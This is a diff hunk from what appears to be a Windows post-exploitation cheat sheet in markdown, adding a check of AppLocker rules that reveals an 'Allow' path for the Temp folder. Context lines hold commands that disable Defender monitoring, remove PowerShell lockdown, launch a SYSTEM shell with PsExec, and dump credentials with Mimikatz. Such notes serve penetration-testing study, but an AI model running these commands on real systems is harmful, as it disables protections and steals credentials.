@@ -124,6 +124,19 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Remove-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy
 PsExec64.exe -i -s C:\Users\fcastle\Desktop\powershell.exe
 ```
+### Check Applocker RuleCollections
+```
+PS C:\Users\fcastle\AppData\Local\Temp> (Get-AppLockerPolicy -Local).RuleCollections
+PathConditions      : {C:\Users\fcastle\AppData\Local\Temp\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 7e918348-5822-2e6e-b4a5-965db95efcfb
+Name                : C:\Users\fcastle\AppData\Local\Temp\*
+Description         :
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+```
 ### Geting hashes with Mimikatz 
 ```
 invoke-mimikatz -dumpcred 
